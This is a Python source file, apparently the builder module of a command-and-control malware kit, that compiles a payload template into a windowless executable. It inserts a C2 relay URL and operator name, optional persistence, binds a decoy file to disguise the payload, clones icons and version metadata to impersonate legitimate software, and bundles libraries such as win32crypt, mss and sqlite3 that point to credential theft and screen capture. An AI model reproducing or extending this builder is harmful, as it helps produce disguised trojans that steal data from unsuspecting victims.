# C2_Client/builder.py
import os
import subprocess
import shutil
import tempfile
import sys
import base64
import json
import psutil
from pyinstaller_versionfile import create_versionfile
import pefile

def build_payload(settings, relay_url, c2_user, log_callback, thread_object):
    """Main build function to orchestrate the PyInstaller compilation."""
    main_payload_full_name = settings.get("payload_name") + settings.get("payload_ext")
    log_callback(f"\n[Builder] Starting build for payload: {main_payload_full_name}...")
    
    with tempfile.TemporaryDirectory() as temp_dir:
        pyinstaller_name = os.path.splitext(main_payload_full_name)[0]
        temp_script_path = os.path.join(temp_dir, f"temp_payload.py")
        
        # Read the payload template
        template_path = "payload/template.py"
        try:
            with open(template_path, "r", encoding="utf-8") as f:
                code = f.read()
        except FileNotFoundError:
            log_callback("[ERROR] payload/template.py not found. Build cannot continue.")
            return None

        # --- Replace placeholders in the template with settings from the UI ---
        code = code.replace("{{RELAY_URL}}", f"'{relay_url}'")
        code = code.replace("{{C2_USER}}", f"'{c2_user}'")
        code = code.replace("{{PERSISTENCE_ENABLED}}", str(settings.get("persistence", False)))
        code = code.replace("{{POPUP_ENABLED}}", str(settings.get("popup_enabled", False)))
        code = code.replace("{{POPUP_TITLE}}", json.dumps(settings.get("popup_title", "")))
        code = code.replace("{{POPUP_MESSAGE}}", json.dumps(settings.get("popup_message", "")))
        
        decoy_filename = "''"; decoy_data_b64 = "''"; bind_path = settings.get("bind_path")
        if bind_path and os.path.exists(bind_path):
            decoy_filename = f"'{os.path.basename(bind_path)}'";
            with open(bind_path, 'rb') as f: decoy_data_b64 = f"'{base64.b64encode(f.read()).decode()}'"
        code = code.replace("{{DECOY_ENABLED}}", str(bool(bind_path)))
        code = code.replace("{{DECOY_FILENAME}}", decoy_filename)
        code = code.replace("{{DECOY_DATA_B64}}", decoy_data_b64)
        
        with open(temp_script_path, "w", encoding="utf-8") as f: f.write(code)
        
        # --- Construct the PyInstaller command ---
        command = [sys.executable, "-m", "PyInstaller", '--onefile', '--noconsole', '--name', pyinstaller_name]
        
        cloning_settings = settings.get("cloning", {})
        if cloning_settings.get("enabled"):
            if cloning_settings.get("icon") and os.path.exists(cloning_settings["icon"]):
                command.extend(['--icon', cloning_settings["icon"]])
            version_file_path = os.path.join(temp_dir, "version.txt")
            create_versionfile(
                output_file=version_file_path, version=cloning_settings["version_info"].get("FileVersion", "1.0.0.0"),
                company_name=cloning_settings["version_info"].get("CompanyName", ""),
                file_description=cloning_settings["version_info"].get("FileDescription", ""),
                internal_name=cloning_settings["version_info"].get("OriginalFilename", ""),
                legal_copyright=cloning_settings["version_info"].get("LegalCopyright", ""),
                original_filename=cloning_settings["version_info"].get("OriginalFilename", ""),
                product_name=cloning_settings["version_info"].get("ProductName", "")
            )
            command.extend(['--version-file', version_file_path])

        # Add necessary libraries that PyInstaller might miss
        hidden_imports = ['requests', 'psutil', 'win32crypt', 'mss', 'PIL', 'winreg', 'shutil', 'sqlite3', 'cryptography']
        for imp in hidden_imports: command.extend(['--hidden-import', imp])
        
        command.append(temp_script_path)
        
        # --- Run the build process ---
        log_callback("[PyInstaller] Starting compilation process...")
        process = subprocess.Popen(command, cwd=temp_dir, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0, encoding='utf-8', errors='ignore')
        thread_object.proc = process
        
        for line in iter(process.stdout.readline, ''):
            if not thread_object._is_running: break
            log_callback(line.strip()) # In a real app, you might filter this for clarity
        
        process.wait()
        
        # --- Finalize the build ---
        if process.returncode == 0 and thread_object._is_running:
            built_exe_path = os.path.join(temp_dir, 'dist', f"{pyinstaller_name}.exe")
            output_dir = "output"
            if not os.path.exists(output_dir): os.makedirs(output_dir)

            final_exe_path = os.path.join(output_dir, main_payload_full_name)
            shutil.move(built_exe_path, final_exe_path)
            
            log_callback(f"\n[SUCCESS] Payload '{main_payload_full_name}' built successfully.")
            log_callback(f"[Location] {os.path.abspath(final_exe_path)}")
        elif thread_object._is_running:
            log_callback(f"\n[ERROR] PyInstaller failed with exit code {process.returncode}.")